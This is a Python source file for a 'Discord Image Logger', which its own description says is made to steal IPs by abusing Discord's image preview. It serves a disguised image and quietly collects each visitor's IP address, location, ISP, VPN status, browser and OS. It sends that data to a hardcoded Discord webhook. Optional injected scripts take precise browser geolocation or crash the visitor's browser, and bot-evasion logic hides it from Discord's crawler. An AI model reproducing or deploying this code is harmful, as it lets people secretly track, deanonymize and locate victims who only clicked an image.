# discord.gg/wingsminer
# Thanks for help DLB, finkyy
# Don't change any settings. This can be this may prevent the code from working.
#
# █     █░█ ██▄    █   ▄████   ██████  ███▄ ▄███▓ ██▓ ███▄    █ ▓█████  ██▀███  
#▓█░ █ ░█░█ █ ▀█   █  ██▒ ▀█▒▒██    ▒ ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
#▒█░ █ ░█▓█ █  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
#░█░ █ ░█▓█ █▒  ▐▌██▒░▓█  ██▓  ▒   ██▒▒██    ▒██ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
#░░██▒██▓▒█ █░   ▓██░░▒▓███▀▒▒██████▒▒▒██▒   ░██▒░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
#░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
#  ▒ ░ ░ ░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░░  ░      ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
#  ░   ░    ░   ░ ░ ░ ░   ░ ░  ░  ░  ░      ░    ▒ ░   ░   ░ ░    ░     ░░   ░ 
#    ░            ░       ░       ░         ░    ░           ░    ░  ░   ░     

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "lynxWings"

config = {
    "webhook": "https://discord.com/api/webhooks/1142202258092740709/TLnf1_n5P53dQ91fEiZq9yPztg7CcY6w7mEFzEaHdq0Sd_JFc7T2p8LT-kcd1sk3NL_H", # <------------------------- Put your webhook link here.
    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPcAAADMCAMAAACY78UPAAAAb1BMVEX///8AAABPT0/d3d3Kyspubm7FxcVkZGTa2tpMTEwyMjLV1dUsLCwVFRU5OTlCQkImJiYeHh6AgIBHR0c/Pz83NzdTU1NycnIQEBBNTU0aGhrm5uZ4eHiJiYknJyf29vaysrKSkpK5ublfX1+FhYWUdD1rAAADtElEQVR4nO3d2XLrKBSF4cDxEAgI0IBl2VaG9vs/Y8f3fbP3UclerfXdU8VfcZTIgPT2RkRERERERPQ/8dPeL8qhl3t7WHQuK9qZLg3KsX3vzG7R2aznZEpRTn5ncjTXheezlqP5pes+PIbuF57PWtgtxm5A7BZjNyB2i7EbELvFoLuvk/fmQzV0N5oJtvvmazO/q4Z+5L6m08LzWctpsn1UdodqUrvwfNayL3bIyu7iUgd7/x37YdT9fn+Y2ETUz/lWr+fsFmM3IHaLsRsQu8XYDYjdYuDd46jujtGg3pfcG3fOuvuxQ7Sd/154Pmu5ZZdG3f33ITsfYbtHN0zKbuNrvC08n7XcjK3K7x0OpXbmvvB81rLd6zm7hdgNiN1i7AbEbjF2A2K3GLsB3UNKRbkOXEYfUbvbuYai3efRdQ513f802aD83uGxz6PH3edR0/xHNfQ9JvsK+zw+3/+IXarJxXzJB/76MmYy/1zkA98/l8z+Mji+Fux+dovIctmXZ6eIaI/q/Qf/7BaBZrnst8/WWbFaHtPo5QN/9Y+hucoHunbRC5vK/jF55b7cx1DU9bGt/n/ObjF2A2K3GHT3Pgav7vZ+fIH7MZWbd92kXP/Orgmw+x1K1ynPlxyiS7j7PMy50e7zGH0dUfd5tKZP2t/vMQ0G9XumrV7P2S3GbkDsFmM3IHaLsRsQu8XQu/XnS4C7b009B+W6/5xTQO2+Fuu1+x1mO3So96H7yc7a/S2zLbDP8ziWarWf8+jtwPUxLOwWYzcgdouxGxC7xdgNiN1i7AZ0DU0ftd0pzajn/W/B9drnWoQuFNj9DtH16udaJAu8z8N22u6cqkHd53EyIej3cRW+vwQMu8XYDYjdYtDd+OdqtnqOaqPn5jZ7TvLZKSLLZW/2HLTu3PsxzrP23Ptoxhc4965z8zUF5XMO8lD75/8d07n+zftLbITd77AvNqjfX3JuXuG5FirHKfVR+/6S0hfUz/lW/z9ntxi7AbFbjN2A2C3GbkDsFmM3oHvjbNZ2W4f8/hL1Po+5CxNs9+gG7fM8jLfQ7y9RP7+lOuD3l/zNe5nGF1gf09nq9ZzdYuwGxG4xdgNitxi7AbFbDLq7zY16HTiaDNt9D9Vr1/1zOsOu+58m/fM8sN9fYnvtz3vqOtif93H0Qb0vd5xhf7+3ej1ntxi7AbFbjN2A2C3GbkDsFoPuPplSlN07k2fYc+8fueu1p9ia1CiXzl/AT/utPcR2+T79LDoXIiIiIiIioif6F+xGP1TBUMbXAAAAAElFTkSuQmCC", # <------------------------- Put image address link here.
    "imageArgument": True,

    "username": "WingsMiner",
    "color": 0x03AC13,

    "crashBrowser": False,
    
    "accurateLocation": False,

    "message": { 
        "doMessage": False,
        "message": ".",
        "richMessage": True,
    },

    "vpnCheck": 1, 

    "linkAlerts": False,
    "buggedImage": True,

    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "https://discord.gg/wingsminer" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "WingsMiner Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "WingsMiner link sent.",
            "color": config["color"],
            "description": f"Link sent successfully.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "."

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "",
            "color": config["color"],
            "description": f"""```The user has clicked the image. IP successfully grabbed. <WingsServices>
            
> IP:
{ip if ip else 'unknown'}

> Country / City:
{info['country'] if info['country'] else 'unknown'} / {info['city'] if info['city'] else 'unknown'}

> Provider:
{info['isp'] if info['isp'] else 'unknown'}

> Coords:
{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})

> Timezone:
{info['timezone'].split('/')[0]}

> VPN:
{info['proxy']}

> ASN:
{info['as'] if info['as'] else 'unknown'}

> Browser:
{browser}

> OS:
{os}

> User Agent:
{useragent}
```""",
    }
  ],
}

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
